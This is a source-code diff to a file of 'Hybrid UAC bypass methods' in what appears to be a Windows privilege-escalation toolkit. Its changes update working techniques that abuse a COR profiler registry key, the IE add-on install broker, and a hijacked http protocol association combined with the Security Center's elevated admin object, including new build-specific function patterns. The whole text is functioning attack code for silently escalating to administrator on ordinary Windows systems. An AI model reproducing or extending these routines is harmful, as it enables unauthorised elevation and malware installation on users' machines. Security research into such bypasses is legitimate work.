@@ -6,7 +6,7 @@
 *
 *  VERSION:     3.52
 *
-*  DATE:        28 Oct 2020
+*  DATE:        29 Oct 2020
 *
 *  Hybrid UAC bypass methods.
 *
@@ -1111,8 +1111,7 @@ NTSTATUS ucmCorProfilerMethod(
             if (lResult == ERROR_SUCCESS) {
 
                 sz = (1 + _strlen(szBuffer)) * sizeof(WCHAR);
-                lResult = RegSetValueEx(
-                    hKey,
+                lResult = RegSetValueEx(hKey,
                     TEXT(""),
                     0,
                     REG_SZ,
@@ -1121,11 +1120,9 @@ NTSTATUS ucmCorProfilerMethod(
 
                 if (lResult == ERROR_SUCCESS) {
 
-                    RtlSecureZeroMemory(&szRegBuffer, sizeof(szRegBuffer));
                     _strcpy(szRegBuffer, T_APARTMENT);
                     sz = (1 + _strlen(szRegBuffer)) * sizeof(WCHAR);
-                    RegSetValueEx(
-                        hKey,
+                    RegSetValueEx(hKey,
                         T_THREADINGMODEL,
                         0,
                         REG_SZ,
@@ -1619,7 +1616,7 @@ NTSTATUS ucmIeAddOnInstallMethod(
 
     HANDLE processHandle = NULL;
 
-    BSTR workdirBstr;
+    BSTR workdirBstr, emptyBstr;
 
     WCHAR szDummyTarget[MAX_PATH * 2];
 
@@ -1761,15 +1758,21 @@ NTSTATUS ucmIeAddOnInstallMethod(
         workdirBstr = SysAllocString(g_ctx->szTempDirectory);
         if (workdirBstr) {
 
-            r = InstallBroker->lpVtbl->RunSetupCommand(InstallBroker,
-                adminInstallerUuid,
-                NULL,
-                cacheItemFilePath,
-                TEXT(""),
-                workdirBstr,
-                TEXT(""),
-                4, //RSC_FLAG_QUIET
-                &processHandle); //there is always no process handle on output, ignore.
+            emptyBstr = SysAllocString(TEXT(""));
+            if (emptyBstr) {
+
+                r = InstallBroker->lpVtbl->RunSetupCommand(InstallBroker,
+                    adminInstallerUuid,
+                    NULL,
+                    cacheItemFilePath,
+                    emptyBstr,
+                    workdirBstr,
+                    emptyBstr,
+                    4, //RSC_FLAG_QUIET
+                    &processHandle); //there is always no process handle on output, ignore.
+
+                SysFreeString(emptyBstr);
+            }
 
             SysFreeString(workdirBstr);
 
@@ -1823,7 +1826,7 @@ NTSTATUS ucmIeAddOnInstallMethod(
 */
 NTSTATUS ucmxWscRegisterAssoc(
     _In_ LPOLESTR ProtoGuid,
-    _In_opt_ USER_ASSOC_PTR* UserAssocFunc,
+    _In_ USER_ASSOC_PTR* UserAssocFunc,
     _In_opt_ LPWSTR lpszPayload,
     _In_ BOOL fRemove
 )
@@ -1836,6 +1839,9 @@ NTSTATUS ucmxWscRegisterAssoc(
 
     WCHAR szBuffer[MAX_PATH];
 
+    if (UserAssocFunc == NULL)
+        return STATUS_INVALID_PARAMETER_2;
+
     ntStatus = supOpenClassesKey(NULL, &classesKey);
     if (!NT_SUCCESS(ntStatus))
         return ntStatus;
@@ -1846,13 +1852,30 @@ NTSTATUS ucmxWscRegisterAssoc(
     // Remove mode: delete protocol entry and leave.
     //
     if (fRemove) {
+
+        switch (g_ctx->dwBuildNumber) {
+        case 18362:
+        case 18363:
+
+            hr = UserAssocFunc->UserAssocSet2(UASET_CLEAR,
+                T_PROTO_HTTP,
+                NULL,
+                0);
+
+            break;
+        default:
+
+            hr = UserAssocFunc->UserAssocSet(UASET_CLEAR,
+                T_PROTO_HTTP,
+                NULL);
+
+            break;
+        }
+
         supRegDeleteKeyRecursive(classesKey, szBuffer);
         NtClose(classesKey);
         return STATUS_SUCCESS;
     }
-
-    if (UserAssocFunc == NULL)
-        return STATUS_INVALID_PARAMETER_2;
 
     if (lpszPayload == NULL)
         return STATUS_INVALID_PARAMETER_3;
@@ -1904,10 +1927,44 @@ NTSTATUS ucmxWscRegisterAssoc(
     //
     // Set mode: register protocol within the shell.
     //
+    if (g_ctx->dwBuildNumber > 19042) {
 
-    hr = UserAssocFunc->UserAssocSet(UASET_PROGID, 
-        T_PROTO_HTTP, 
-        ProtoGuid);
+        hr = UserAssocFunc->UserAssocSet2(UASET_PROGID,
+            T_PROTO_HTTP,
+            ProtoGuid,
+            2);
+
+    }
+    else {
+
+        switch (g_ctx->dwBuildNumber) {
+        case 18362:
+        case 18363:
+        case 17763:
+
+            hr = UserAssocFunc->UserAssocSet2(UASET_PROGID,
+                T_PROTO_HTTP,
+                ProtoGuid,
+                2);
+
+            break;
+
+        default:
+
+            hr = UserAssocFunc->UserAssocSet(UASET_PROGID,
+                T_PROTO_HTTP,
+                ProtoGuid);
+
+            break;
+        }
+
+    }
+
+#ifdef _DEBUG
+    _strcpy(szBuffer, TEXT("UserAssocSet 0x"));
+    ultohex(hr, _strend(szBuffer));
+    ucmShowMessage(FALSE, szBuffer);
+#endif
 
     if (SUCCEEDED(hr))
         ntStatus = STATUS_SUCCESS;
@@ -1937,6 +1994,7 @@ NTSTATUS ucmWscActionFindInternalRoutine(
     WCHAR  szBuffer[MAX_PATH * 2];
 
     Function->UserAssocSet = NULL;
+    Function->Valid = FALSE;
 
     switch (g_ctx->dwBuildNumber) {
     case 7601:
@@ -1956,9 +2014,12 @@ NTSTATUS ucmWscActionFindInternalRoutine(
         patternSize = sizeof(UserAssocSet_17763);
         break;
     case 18362:
+        patternPtr = UserAssocSet_18362;
+        patternSize = sizeof(UserAssocSet_18362);
+        break;
     case 18363:
-        patternPtr = UserAssocSet_18362_18363;
-        patternSize = sizeof(UserAssocSet_18362_18363);
+        patternPtr = UserAssocSet_18363;
+        patternSize = sizeof(UserAssocSet_18363);
         break;
     case 19041:
         patternPtr = UserAssocSet_19041;
@@ -1969,6 +2030,11 @@ NTSTATUS ucmWscActionFindInternalRoutine(
         patternSize = sizeof(UserAssocSet_19042);
         break;
     default:
+        if (g_ctx->dwBuildNumber > 19042) {
+            patternPtr = UserAssocSet_vNext;
+            patternSize = sizeof(UserAssocSet_vNext);
+            break;
+        }
         return STATUS_NOT_SUPPORTED;
     }
 
@@ -2006,6 +2072,7 @@ NTSTATUS ucmWscActionFindInternalRoutine(
 
     if (IN_REGION(funcPtr, sectionBase, sectionSize)) {
         Function->UserAssocSet = (pfnUserAssocSet)funcPtr;
+        Function->Valid = TRUE;
         return STATUS_SUCCESS;
     }
     else {
@@ -2034,7 +2101,11 @@ NTSTATUS ucmWscActionProtocolMethod(
     USER_ASSOC_PTR SetUserAssoc;
     GUID guid;
 
+#ifdef _DEBUG
     WCHAR szDebug[0x100];
+#endif
+
+    RtlSecureZeroMemory(&SetUserAssoc, sizeof(USER_ASSOC_PTR));
 
     hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
 
@@ -2048,17 +2119,21 @@ NTSTATUS ucmWscActionProtocolMethod(
 
         MethodResult = ucmWscActionFindInternalRoutine(&SetUserAssoc);
         if (!NT_SUCCESS(MethodResult)) {
+#ifdef _DEBUG
             _strcpy(szDebug, L"ucmWscActionFindInternalRoutine FAIL 0x");
             ultohex(MethodResult, _strend(szDebug));
             ucmShowMessage(FALSE, szDebug);
+#endif
             break;
         }
 
         MethodResult = ucmxWscRegisterAssoc(protoGuidString, &SetUserAssoc, lpszPayload, FALSE);
         if (!NT_SUCCESS(MethodResult)) {
+#ifdef _DEBUG
             _strcpy(szDebug, L"ucmxWscRegisterAssoc FAIL 0x");
             ultohex(MethodResult, _strend(szDebug));
             ucmShowMessage(FALSE, szDebug);
+#endif
             break;
         }
 
@@ -2069,20 +2144,12 @@ NTSTATUS ucmWscActionProtocolMethod(
             CLSCTX_LOCAL_SERVER,
             &WscAdminObject);
 
-        if (FAILED(r)) {
-            _strcpy(szDebug, L"ucmAllocateElevatedObject FAIL 0x");
-            ultohex(r, _strend(szDebug));
-            ucmShowMessage(FALSE, szDebug);
+        if (FAILED(r))
             break;
-        }
 
         r = WscAdminObject->lpVtbl->Initialize(WscAdminObject);
-        if (FAILED(r)) {
-            _strcpy(szDebug, L"WscAdminObject->Initialize FAIL 0x");
-            ultohex(r, _strend(szDebug));
-            ucmShowMessage(FALSE, szDebug);
+        if (FAILED(r))
             break;
-        }
 
         r = WscAdminObject->lpVtbl->DoModalSecurityAction(WscAdminObject, NULL, 103, NULL);
 
@@ -2090,11 +2157,6 @@ NTSTATUS ucmWscActionProtocolMethod(
 
         if (SUCCEEDED(r))
             MethodResult = STATUS_SUCCESS;
-        else {
-            _strcpy(szDebug, L"WscAdminObject->DoModalSecurityAction FAIL 0x");
-            ultohex(r, _strend(szDebug));
-            ucmShowMessage(FALSE, szDebug);
-        }
 
     } while (FALSE);
 
@@ -2105,7 +2167,8 @@ NTSTATUS ucmWscActionProtocolMethod(
         WscAdminObject->lpVtbl->Release(WscAdminObject);
 
     if (protoGuidString) {
-        ucmxWscRegisterAssoc(protoGuidString, NULL, NULL, TRUE);
+        if (SetUserAssoc.Valid)
+            ucmxWscRegisterAssoc(protoGuidString, &SetUserAssoc, NULL, TRUE);
         CoTaskMemFree(protoGuidString);
     }
 
